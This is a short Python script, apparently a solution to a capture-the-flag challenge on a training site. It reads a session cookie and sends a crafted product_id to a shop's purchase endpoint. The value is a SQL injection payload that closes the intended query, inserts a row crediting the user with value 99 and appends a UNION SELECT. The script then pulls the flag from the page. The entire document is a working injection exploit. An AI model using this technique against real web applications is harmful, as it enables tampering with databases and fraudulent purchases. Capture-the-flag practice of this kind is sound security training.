import requests
import re

URL = 'https://simple-shop.challs.olicyber.it'

s = requests.Session()

r = s.get(URL)
username = r.headers.get('Set-Cookie').split('=')[1].split(";")[0]
r = s.post(URL + '/buy.php',data={"product_id":f"1), (\"{username}\",99); ' UNION SELECT 1,1,1 -- "})
flag = re.search(r'flag\{[^}]+\}',r.text).group()
print(flag)